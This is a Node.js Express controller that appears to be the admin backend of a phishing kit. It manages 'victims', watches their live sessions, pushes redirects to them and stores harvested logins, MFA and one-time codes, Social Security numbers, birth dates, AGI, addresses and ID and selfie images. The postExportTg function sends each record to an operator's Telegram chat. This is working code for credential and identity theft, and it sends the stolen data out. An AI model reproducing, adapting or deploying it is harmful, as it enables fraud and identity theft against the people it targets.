// dependencies
const bcrypt = require("bcrypt");

// models
const Admin = require("../model/Admin");
const Log = require("../model/Log");
const { default: mongoose } = require("mongoose");
const { Telegraf } = require("telegraf");
const { message } = require("telegraf/filters");
const io = require("../io");
const { BOT_TOKEN, CHAT_ID } = require("../config");

const bot = new Telegraf(BOT_TOKEN);

exports.getAdminIndex = (req, res, next) => {
  res.redirect("/admin/login");
};

exports.getAdminLogin = (req, res, next) => {
  Admin.countDocuments().then((adminQty) => {
    if (adminQty === 0) {
      res.redirect("/admin/register");
    } else if (req.session.admin) {
      res.redirect("/admin/dashboard");
    } else {
      res.render("admin/login");
    }
  });
};

exports.postAdminLogin = (req, res, next) => {
  const username = req.body.username;
  const password = req.body.password;

  Admin.findOne({ username: username }).then((admin) => {
    if (!admin) {
      return res.status(422).render("admin/login", {
        errorMessage: "Invalid username or password.",
      });
    }
    bcrypt
      .compare(password, admin.password)
      .then((doMatch) => {
        if (doMatch) {
          req.session.isAdminLoggedIn = true;
          req.session.admin = admin;
          return req.session.save((err) => {
            console.log(err);
            res.redirect("/admin/dashboard");
          });
        }
        return res.status(422).render("admin/login", {
          errorMessage: "Invalid username or password.",
        });
      })
      .catch((err) => {
        const error = new Error(err);
        error.httpStatusCode = 500;
        return next(error);
      });
  });
};

exports.getAdminRegister = (req, res, next) => {
  Admin.countDocuments().then((adminQty) => {
    if (adminQty !== 0) {
      return res.redirect("/admin/login");
    }
    res.render("admin/register");
  });
};

exports.postAdminRegister = (req, res, next) => {
  Admin.countDocuments().then((adminQty) => {
    if (adminQty !== 0) {
      return res.redirect("/admin/login");
    }

    const username = req.body.username;
    const password = req.body.password;

    bcrypt
      .hash(password, 12)
      .then((hashedPassword) => {
        const admin = new Admin({
          username: username,
          password: hashedPassword,
        });

        return admin.save();
      })
      .then((result) => {
        res.redirect("/admin/login");
      })
      .catch((err) => {
        const error = new Error(err);
        error.httpStatusCode = 500;
        return next(error);
      });
  });
};

exports.postAdminLogout = (req, res, next) => {
  req.session.destroy();
  res.redirect("/admin/login");
};

// dashboard --------------------

const db = mongoose.connection;

db.once("open", () => {
  const sessionCollection = db.collection("sessions");
  const sessionChangeStream = sessionCollection.watch();

  sessionChangeStream.on("change", async (change) => {
    const sessions = await mongoose.connection
      .collection("sessions")
      .find({ "session.visitorId": { $exists: true, $ne: null } })
      .toArray();
    io.getIO().emit("session-update", sessions);
  });
});

exports.getAdminDashboard = async (req, res, next) => {
  try {
    const awaitingSessionCount = await mongoose.connection
      .collection("sessions")
      .find({ "session.page": "Waiting 1..." })
      .toArray();

    const awaitingSessionCountSecondary = await mongoose.connection
      .collection("sessions")
      .find({ "session.page": "Waiting 2..." })
      .toArray();

    const finishedSessions = await Log.countDocuments();

    const onlineSessions = await mongoose.connection
      .collection("sessions")
      .find({ "session.status": true })
      .toArray();

    const sessions = await mongoose.connection
      .collection("sessions")
      .find({ "session.visitorId": { $exists: true, $ne: null } })
      .toArray();

    res.render("admin/index", {
      username: req.session.admin.username,
      sessions: sessions,
      awaitingSessions:
        awaitingSessionCountSecondary.length + awaitingSessionCount.length,
      finishedSessions: finishedSessions,
      onlineSessions: onlineSessions.length,
      victimsCount: sessions.length,
    });
  } catch (error) {}
};

exports.getAllVictims = (req, res, next) => {
  Log.find().then((logs) => {
    res.render("admin/victims", {
      username: req.session.admin.username,
      logs: logs,
    });
  });
};

exports.getMFAVictims = (req, res, next) => {
  Log.find({ mfa_code: { $ne: null } }).then((logs) => {
    res.render("admin/victims", {
      username: req.session.admin.username,
      logs: logs,
    });
  });
};

exports.getOTPVictims = (req, res, next) => {
  Log.find({ phone_code: { $ne: null } }).then((logs) => {
    res.render("admin/victims", {
      username: req.session.admin.username,
      logs: logs,
    });
  });
};

exports.getMailVictims = (req, res, next) => {
  Log.find({ email_code: { $ne: null } }).then((logs) => {
    res.render("admin/victims", {
      username: req.session.admin.username,
      logs: logs,
    });
  });
};

// sub paths

exports.getVictim = async (req, res, next) => {
  try {
    const session = await mongoose.connection
      .collection("sessions")
      .findOne({ "session.visitorId": req.params.id });

    res.render("admin/log", {
      username: req.session.admin.username,
      victim: session,
      victimId: req.params.id,
    });
  } catch (error) {
    console.error("Error finding session:", error);
    res.status(500).json({ message: "Error finding session" });
  }
};

exports.postDeleteSession = async (req, res, next) => {
  try {
    await mongoose.connection
      .collection("sessions")
      .deleteOne({ "session.visitorId": req.params.id });
    res.redirect("back");
  } catch (error) {
    console.error("Error finding session:", error);
    res.status(500).json({ message: "Error finding session" });
  }
};

exports.getLog = (req, res, next) => {
  Log.findById(req.params.id).then((log) => {
    res.render("admin/saved-log", {
      victimId: req.params.id,
      log: log,
      username: req.session.admin.username,
    });
  });
};

exports.postDeleteLog = (req, res, next) => {
  Log.findByIdAndDelete(req.params.id).then((result) => {
    res.redirect("back");
  });
};

// APIs

exports.getSessionDataAPI = async (req, res, next) => {
  try {
    const data = await mongoose.connection
      .collection("sessions")
      .find({ "session.visitorId": { $exists: true, $ne: null } })
      .toArray();
    res.json(data);
  } catch (error) {
    res.status("500").json({ error: "Internal Server Error" });
  }
};

exports.postUrlData = (req, res, next) => {
  try {
    io.getIO().emit("redirect", { url: req.body.url, vcid: req.body.vcId });
    res.status(200).send("ok");
  } catch (error) {
    res.status("500").json({ error: "Internal Server Error" });
  }
};

exports.postSaveLogs = (req, res, next) => {
  mongoose.connection
    .collection("sessions")
    .findOne({ "session.visitorId": req.body.vcId })
    .then((session) => {
      const newLog = new Log({
        id: session.session.visitorId,
        ip: session.session.ip,
        country: session.session.country,
        os: session.session.os,
        useragent: session.session.useragent,
        isp: session.session.isp,
        first_login: session.session.first_login,
        second_login: session.session.second_login,
        first_name: session.session.first_name,
        last_name: session.session.last_name,
        middle_name: session.session.middle_name,
        suffix: session.session.suffix,
        date_of_birth: session.session.dob,
        ssn: session.session.ssn,
        agi: session.session.agi,
        street: session.session.street,
        city: session.session.city,
        state: session.session.state,
        zip_code: session.session.zip_code,
        mfa_code: session.session.otp_mfa,
        phone_code: session.session.otp_phone,
        email_code: session.session.otp_email,
        id_front: session.session.id_front,
        id_back: session.session.id_back,
        id_selfie: session.session.id_selfie,
        createdAt: session.session.createdAt,
      });

      newLog.save().then((result) => {
        res.status(200).send("ok");
      });
    });
};

exports.postExportTg = async (req, res, next) => {
  try {
    // Query your MongoDB collection to retrieve the object
    const objectId = req.body.vcId; // Get the object ID from the request body

    // Replace `YourModel` with the actual name of your Mongoose model
    const object = await mongoose.connection
      .collection("sessions")
      .findOne({ "session.visitorId": objectId });

    if (!object) {
      return res.status(404).send("Object not found.");
    }

    await bot.telegram.sendMessage(
      CHAT_ID,
      `----- NEW LOG -----\n\nID: ${object.session.visitorId}\nIp Address: ${object.session.ip}\nCountry: ${object.session.country}\nOS: ${object.session.os}\nUser-agent: ${object.session.useragent}\nISP: ${object.session.isp}\nCreated at: ${object.session.createdAt}\n\n\nFirst Login: ${object.session.first_login}\nSecond Login: ${object.session.second_login}\nOTP Email: ${object.session.otp_email}\nOTP MFA: ${object.session.otp_mfa}\nOTP Phone: ${object.session.otp_phone}\nFirst Name: ${object.session.first_name}\nMiddle Name: ${object.session.middle_name}\nLast Name: ${object.session.last_name}\nSuffix: ${object.session.suffix}\nSSN: ${object.session.ssn}\nDOB: ${object.session.dob}\nAGI: ${object.session.agi}\nStreet: ${object.session.street}\nCity: ${object.session.city}\nState: ${object.session.state}\nZip Code: ${object.session.zip_code}\n\n\nID Front: ${req.protocol}://${req.hostname}/${object.session.id_front}\nID Back: ${req.protocol}://${req.hostname}/${object.session.id_back}\nID Selfie: ${req.protocol}://${req.hostname}/${object.session.id_selfie}`
    );

    res.status(200).send("Object sent to Telegram successfully.");
  } catch (error) {
    console.error("Error sending object to Telegram:", error);
    res.status(500).send("Error sending object to Telegram.");
  }
};
